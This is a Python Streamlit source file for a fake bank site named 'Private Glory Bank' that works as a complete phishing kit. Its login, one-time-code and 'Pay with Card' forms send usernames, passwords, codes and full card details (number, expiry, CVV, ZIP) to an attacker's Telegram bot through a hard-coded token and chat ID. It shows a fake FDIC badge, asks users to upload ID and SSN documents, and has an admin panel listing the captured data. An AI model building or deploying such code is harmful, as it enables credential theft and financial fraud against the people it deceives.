import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import requests
import random

# ==================== TELEGRAM LIVE EXFIL — YOUR REAL BOT ====================
def tg(message):
    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"   # YOUR REAL TOKEN
    CHAT_ID = "141975691"                                        # YOUR REAL CHAT ID
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, data=payload, timeout=10)
    except:
        pass  # Silent & deadly

# ==================== SESSION STATE & 90-DAY HISTORY ====================
state = st.session_state
state.checking = state.get("checking", 12340.50)
state.savings  = state.get("savings", 14911.32)
state.captured = state.get("captured", [])
state.otp_log  = state.get("otp_log", [])
state.files    = state.get("files", [])
state.auth     = state.get("auth", False)
state.otp_ok   = state.get("otp_ok", False)
state.admin    = state.get("admin", False)

if "tx" not in state:
    merchants = ["Amazon", "Walmart", "Shell Gas", "Starbucks", "Netflix", "Uber", "Target", "Costco", "Apple", "Best Buy", "Chick-fil-A", "Home Depot"]
    txs = []
    start = datetime.now() - timedelta(days=90)
    for _ in range(88):
        date = start + timedelta(days=random.randint(0,90))
        amount = round(random.uniform(7.99, 899.99), 2)
        txs.append({
            "date": date.strftime("%m/%d"),
            "desc": random.choice(merchants),
            "amount": -amount
        })
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="USA", layout="wide")

# ==================== AMERICAN STARS + THEME + FDIC ====================
st.markdown("""
<style>
    .stApp {background: linear-gradient(135deg, #0a0e17, #1c1f2e, #0f1629); color: #e0e0e0;}
    .header {background: linear-gradient(90deg, #002868 0%, #BF0A30 100%);
             padding: 3rem; text-align: center; border-bottom: 18px solid #fcca46;
             border-radius: 0 0 90px 90px; box-shadow: 0 35px 80px rgba(0,0,0,0.9);}
    .stars {font-size: 140px; animation: pulse 3s infinite;}
    @keyframes pulse {0%,100%{opacity:0.8;} 50%{opacity:1;}}
    .glass {background: rgba(255,255,255,0.09); backdrop-filter: blur(22px);
            border-radius: 40px; border: 1px solid rgba(255,255,255,0.22); padding: 2.8rem;}
    .fdic {position: fixed; bottom: 10px; right: 10px; z-index: 9999;}
    h1, h2, h3 {color: #fcca46 !important; text-shadow: 0 0 25px #fcca46;}
    .stButton>button {background: linear-gradient(45deg, #BF0A30, #002868);
                      color: white; font-weight: bold; border-radius: 80px; height: 5rem; font-size: 1.4rem;}
</style>
<div class="fdic"><img src=https://i.ibb.co/0jF3Y7Q/fdic-ssl.png width=300></div>
""", unsafe_allow_html=True)

def header():
    st.markdown('''
    <div class="header">
        <div class="stars">USA USA USA USA USA USA USA USA USA USA</div>
        <h1>PRIVATE GLORY BANK</h1>
        <p style="font-size:32px;color:#fcca46">Land of the Free • Home of the Brave</p>
        <div class="stars">USA USA USA USA USA USA USA USA USA USA</div>
    </div>
    ''', unsafe_allow_html=True)

# ==================== LOGIN (USERNAME: Awesome12@) ====================
def login():
    header()
    col1, col2, col3 = st.columns([1,1.4,1])
    with col2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        user = st.text_input("User ID", placeholder="Awesome12@")
        pwd = st.text_input("Password", type="password", placeholder="SecureUSA2025!")
        if st.button("Login Securely", type="primary", use_container_width=True):
            log = f"NEW LOGIN\nUser: {user}\nPass: {pwd}\nTime: {datetime.now()}"
            tg(log)
            state.captured.append({"user":user, "pass":pwd, "time":datetime.now().isoformat()})
            if user == "Awesome12@" and pwd == "SecureUSA2025!":
                state.auth = True
                tg("VALID CREDENTIALS — ACCESS GRANTED")
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.admin = True
                st.rerun()
            else:
                st.error("Access Denied")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP ====================
def otp():
    header()
    code = st.text_input("Enter 6-digit code", max_chars=6, placeholder="000000")
    if st.button("Verify Code", type="primary", use_container_width=True):
        tg(f"OTP ENTERED: {code}")
        state.otp_log.append({"code":code, "time":datetime.now().isoformat()})
        if len(code) == 6 and code.isdigit():
            state.otp_ok = True
            tg("OTP ACCEPTED — FULL ACCESS GRANTED")
            st.success("Verified Successfully")
            st.rerun()
        else:
            st.error("Invalid Code")

# ==================== DASHBOARD ====================
def dashboard():
    header()
    st.markdown(f"### Good Afternoon • {datetime.now().strftime('%A, %B %d')}")
    c1,c2,c3,c4 = st.columns(4)
    c1.metric("Checking", f"${state.checking:,.2f}")
    c2.metric("Savings", f"${state.savings:,.2f}")
    c3.metric("Total Balance", f"${state.checking + state.savings:,.2f}")
    c4.metric("Transactions", len(state.tx))

    col1, col2 = st.columns([2,1])
    with col1:
        st.markdown("<div class='glass'><h3>Recent Transactions</h3>", unsafe_allow_html=True)
        df = pd.DataFrame(state.tx[:15])
        st.dataframe(df[["date","desc","amount"]], use_container_width=True, hide_index=True)
        st.markdown("</div>", unsafe_allow_html=True)
    with col2:
        st.markdown("<div class='glass'><h3>Account Distribution</h3>", unsafe_allow_html=True)
        fig = px.pie(values=[state.checking, state.savings], names=["Checking","Savings"],
                     color_discrete_sequence=["#fcca46","#002868"], hole=0.5)
        st.plotly_chart(fig, use_container_width=True)
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== TRANSFER (INTERNAL + CARD PAY) ====================
def transfer():
    header()
    tab1, tab2 = st.tabs(["Internal Transfer", "Pay with Card"])
    
    with tab1:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
        to_acc = "Savings ••••1812" if "Checking" in from_acc else "Checking ••••1776"
        amount = st.number_input("Amount ($)", min_value=0.01, format="%.2f")
        if st.button("Transfer Now", type="primary", use_container_width=True):
            if "Checking" in from_acc:
                if amount > state.checking:
                    st.error("Insufficient funds in Checking")
                else:
                    state.checking -= amount
                    state.savings += amount
                    st.success(f"Transferred ${amount:,.2f} → Savings")
            else:
                if amount > state.savings:
                    st.error("Insufficient funds in Savings")
                else:
                    state.savings -= amount
                    state.checking += amount
                    st.success(f"Transferred ${amount:,.2f} → Checking")
            state.tx.insert(0, {"date": datetime.now().strftime("%m/%d"), "desc": f"Transfer → {to_acc.split()[0]}", "amount": amount})
            state.tx.insert(0, {"date": datetime.now().strftime("%m/%d"), "desc": f"Transfer ← {from_acc.split()[0]}", "amount": -amount})
            st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

    with tab2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        card = st.text_input("Card Number", placeholder="5412 1776 2024 1812")
        exp = st.text_input("Expiry (MM/YY)", placeholder="07/29")
        cvv = st.text_input("CVV", type="password", placeholder="776")
        zipc = st.text_input("Billing ZIP")
        payee = st.text_input("Payee / Bill")
        amt = st.number_input("Amount", min_value=0.01)
        if st.button("Pay Bill", type="primary", use_container_width=True):
            fullz = f"FULLZ\nCard: {card}\nExp: {exp}\nCVV: {cvv}\nZIP: {zipc}\nPayee: {payee}\nAmount: ${amt}"
            tg(fullz)
            state.captured.append({"fullz": fullz, "time": datetime.now().isoformat()})
            st.success(f"Payment of ${amt:,.2f} to {payee} successful")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== MESSAGES & FILE UPLOAD ====================
def messages():
    header()
    st.markdown("<div class='glass'>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload ID, SSN, Tax Forms, etc.", type=["pdf","jpg","png","docx","txt"])
    if uploaded:
        tg(f"FILE UPLOADED\nName: {uploaded.name}\nSize: {uploaded.size} bytes")
        state.files.append({"name": uploaded.name, "size": uploaded.size, "time": datetime.now().isoformat()})
        st.success(f"Document '{uploaded.name}' received securely")
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== ADMIN PANEL ====================
def admin():
    header()
    st.markdown("<h1 style='color:#fcca46;text-align:center'>ADMIN PANEL — LIVE DATA</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]: st.json([x for x in state.captured if "fullz" in str(x)], expanded=True)
    with tabs[3]: st.dataframe(pd.DataFrame(state.files))
    with tabs[4]: st.dataframe(pd.DataFrame(state.tx[:100]))

# ==================== SIDEBAR ====================
def sidebar():
    st.sidebar.markdown('''
    <div style="text-align:center;padding:30px;background:#002868;border-radius:30px">
        <div class="stars">USA USA USA USA USA</div>
        <h3 style="color:#fcca46">PGB</h3>
    </div>
    ''', unsafe_allow_html=True)
    return st.sidebar.radio("Navigate", ["Dashboard", "Transfer", "Messages", "Logout"])

# ==================== MAIN FLOW ====================
if not state.auth:
    login()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Transfer": transfer()
    elif page == "Messages": messages()
    elif page == "Logout":
        st.session_state.clear()
        st.rerun()
